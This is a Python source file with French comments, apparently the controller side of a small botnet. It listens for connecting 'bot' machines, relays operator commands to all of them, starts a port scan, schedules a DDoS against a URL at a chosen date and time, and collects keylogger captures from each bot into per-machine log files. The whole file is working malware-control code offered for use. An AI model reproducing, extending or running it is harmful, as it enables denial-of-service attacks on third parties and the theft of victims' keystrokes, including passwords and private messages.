import argparse
import socket
import sys
import threading
import time

from Autre_Element import Menu, portscanner, Chargement


# References: https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Serveur:
    def __init__(self, host, port):
        # Déclaration de la variable
        self.host = host
        self.port = port
        # Connexion au socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    # -------------------------------------------------------------------------------------------------#

    def connexion(self):
        global ServeurActif, my_client
        time.sleep(1)
        self.sock.listen(5)
        print(f"{Colors.BOLD}En attente de la connexion du bot.. {Colors.ENDC}")
        ServeurActif = True
        i = 0
        while ServeurActif:
            try:
                self.sock.settimeout(8)
                bot, address = self.sock.accept()
                print(f"{Colors.OKGREEN} \n BOT  connecté | IP {address[0]} | port {address[1]}  {Colors.ENDC}")
                my_client += [bot]
                if i < 1:
                    threading.Thread(target=self.recvClient).start()
                    threading.Thread(target=self.sendClient).start()
                i += 1
            except:
                pass
    # Envoi de données
    def sendClient(self):
        global my_client, ServeurActif
        while ServeurActif:
            try:
                msgserveur = input(f"{Colors.OKBLUE}Serveur >>  {Colors.ENDC}")
                for bot in my_client:
                    bot.send(msgserveur.encode("utf-8"))
                    if msgserveur == "1":
                        print(f"{Colors.OKGREEN}Machine {bot.getpeername()} déjà connectée {Colors.ENDC}")

                    elif msgserveur == "2":
                        Menu.menuKey()


                    elif msgserveur == "3":
                        Menu.menuPortScan()
                        portscanner.start_scan()
                        time.sleep(10)
                        Main()
                        pass

                    elif msgserveur == "4":
                        Menu.menuDDOS()
                        url = ""

                        while url[:4] != "http":
                            try:
                                url = input(f"{Colors.BOLD}Entrez l'URL (Commencant par http) : {Colors.ENDC}")
                                bot.send(url.encode("utf-8"))
                            except:
                                print(f"{Colors.FAIL} Erreur d'URL {Colors.ENDC}")


                            try:
                                # ---------------mois-------------------
                                mois = int(input("Entrez le mois: "))
                                while mois < 0 or mois > 12:
                                        print(f"{Colors.FAIL}Entrez un choix valide{Colors.ENDC}")
                                        mois = int(input("Entrez le mois: "))
                                mois = str(mois)
                                bot.send(mois.encode("utf-8"))
                                # ---------------jour-------------------
                                jour = int(input("Entrez le jour: "))
                                while jour < 0 or jour > 31:
                                    print(f"{Colors.FAIL}Entrez un choix valide{Colors.ENDC}")
                                    jour = int(input("Entrez le jour: "))
                                jour = str(jour)
                                bot.send(jour.encode("utf-8"))
                                # ---------------heure-------------------
                                heure = int(input("Entrez l'heure: "))
                                while heure < 0 or heure > 24:
                                    print(f"{Colors.FAIL}Entrez un choix valide{Colors.ENDC}")
                                    heure = int(input("Entrez l'heure: "))
                                heure = str(heure)
                                bot.send(heure.encode("utf-8"))
                                # ---------------minute-------------------
                                minute = int(input("Entrez la minute: "))
                                while minute < 0 or  minute > 60:
                                    print(f"{Colors.FAIL}Entrez un choix valide{Colors.ENDC}")
                                    minute = int(input("Entrez la minute: "))
                                minute = str(minute)
                                bot.send(minute.encode("utf-8"))



                            except ValueError as msg:
                                print(f"{Colors.FAIL}Erreur de valeur {Colors.ENDC}" + str(msg))

                        time.sleep(10)
                        print(f"{Colors.OKGREEN}Fin du DDOS {Colors.ENDC}")
                        time.sleep(2)
                        Main()

                if msgserveur == "5":
                    print(f"{Colors.FAIL}Déconnexion de {bot.getpeername()} {Colors.ENDC}")
                    for bot in my_client:
                        my_client.remove(bot)
                        bot.close()
                    print(f"{Colors.BOLD} Vous allez être redirigez vers le menu principal.. {Colors.ENDC}")
                    time.sleep(2)
                    Main()
                    choixMenu(host,port)
                    ServeurActif = False

            except socket.error as msg:
                print(f"{Colors.FAIL}Erreur d'envoi: {Colors.ENDC}" + str(msg))


    # Reception de données
    # Je joue avec les deux threads les maintenir actifs.
    def recvClient(self):
        global my_client, ServeurActif
        while ServeurActif:
            for bot in my_client:
                try:
                    msgClient = bot.recv(1024).decode("utf-8")
                    # SI LE MSG CORRESPOND A CA IL IRA RECOPIER LE FICHIER
                    if msgClient == "Envoi du fichier en cours.. ":

                        print(f"{Colors.BOLD}Réception du fichier..{Colors.ENDC}")
                        NbLigne = input(f"{Colors.BOLD}Combien de lettre désirez vous ('0' si vous voulez tout): {Colors.ENDC}")
                        bot.send(NbLigne.encode("utf-8"))
                        texte = bot.recv(4096).decode("utf-8")
                        BotName = bot.getpeername()
                        try:
                            fichier = open("keylog"+ str(BotName) + ".txt", 'a+')
                            for element in texte:
                                    # TEST DE METTRE LE NOM DU BOT POUR SAVOIR A QUI APPARTIENT LE LOG
                                fichier.write(element)

                            fichier.close()
                            Chargement.start()
                            print(f" {Colors.OKGREEN}\n Envoi terminé avec succès ! {Colors.ENDC}")
                        except ValueError as msg:
                            print(f"{Colors.FAIL} \n Erreur d'envoi: {Colors.ENDC}" + str(msg))


                    else:
                        print(f" \n {Colors.FAIL}Bot: {bot.getpeername()} >> {msgClient} {Colors.ENDC}")

                except socket.error as msg:
                    print(f"\n {Colors.FAIL}WARNING : Client  déconnecté  {Colors.ENDC}" + str(msg))





# -------------------------------------------------------------------------------------------#
def Main():
    Menu.bannière()
    Menu.menu()


def choixMenu(host, port):
    choix = input(f"{Colors.OKGREEN}Serveur >>  {Colors.ENDC}")
    global ServeurActif
    if choix == "1":
        MonServeur = Serveur(host, port)
        MonServeur.connexion()
        choixMenu(host,port)
    elif choix == "2" or choix == "3" or choix == "4":
        if ServeurActif:
            pass
        else:
            print(f"{Colors.FAIL}Veuillez connecter d'abord une machine.{Colors.ENDC}")
            time.sleep(3)
            Main()
            choixMenu(host,port)
    elif choix == "5":
        print(f"{Colors.BOLD}Fin du programme{Colors.ENDC}")
        ServeurActif = False
        time.sleep(5)
        sys.exit(0)
    else:
        print(f"{Colors.FAIL}Choix invalide{Colors.ENDC}")
        time.sleep(3)
        Main()
        choixMenu(host,port)



# -------------------------------------------------------------------------------------------#
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Entrez le port et l'ip de l'hote ( par défaut : 127.0.0.1 et 6969)")
    parser.add_argument("-H", "--IPHote", required=False, help="Entrez l'ip de l'hote", type=str, default="127.0.0.1")
    parser.add_argument("-P", "--numPort", required=False, help="Entrez le port", type=int, default=6666)
    args = parser.parse_args()
    host = str(args.IPHote)
    port = int(args.numPort)
    my_client = []
    ServeurActif = False
    MonServeur = Serveur
    main = Main()
    choixMenu(host, port)


# -------------------------------------------------------------------------------------------#
